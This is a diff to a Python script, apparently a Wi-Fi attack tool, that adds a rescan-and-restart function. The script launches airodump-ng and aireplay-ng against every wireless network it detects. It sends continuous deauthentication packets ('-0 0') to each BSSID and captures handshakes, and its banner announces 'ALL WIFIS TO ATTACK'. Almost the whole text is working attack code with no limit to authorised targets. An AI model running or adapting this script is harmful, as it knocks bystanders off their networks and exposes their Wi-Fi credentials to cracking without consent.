@@ -12,6 +12,14 @@ def monmode():
 monmode()
 # FUCK BRO MY BACKHURTS FROM TRYING TO FIGURE OUT HOW THE FUCKING RESCAN THREAD WAS FUCKING UP TO LEGIT SO LONG 
 
+def kill():
+  time.sleep(2)
+  term.terminate()
+  time.sleep(2)
+  term2.terminate()
+  time.sleep(2)
+  handshake()
+
 def handshake():
  os.system("rm -rf pwn-01.csv")
  names = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
@@ -22,7 +30,7 @@ def handshake():
  pwn.terminate()
  seen_essids = set()
  os.system("clear")
- threading.Timer(60, handshake).start()
+ threading.Timer(60, kill).start()
  print("\nRESCANNING IN 60 SECONDS\n")
  print("\n\033[0;35mPLEASE WAIT... AS SOON AS SSIDS POP UP IT WILL START ATTACKING\n ")
  print("\r                       ALL WIFIS TO ATTACK ")
@@ -35,6 +43,7 @@ def handshake():
     for rows in sec_read: 
       global essid # yes i know its global and not being used global lol just keep it here
       global mac,ch
+      global term,term2
       essid = rows["ESSID"]
       mac = rows["BSSID"].strip()
       ch = rows["channel"].strip()
@@ -42,7 +51,6 @@ def handshake():
        if essid not in seen_essids:
         print(f"\033[0;32m{essid}\n")
         seen_essids.add(essid)
-        global term,term2
         term = subprocess.Popen(["sudo", "airodump-ng", "-c", ch, intface], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
         time.sleep(0.022)
         term2 = subprocess.Popen(["sudo", "aireplay-ng", "-0", "0", "-a", mac, intface], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
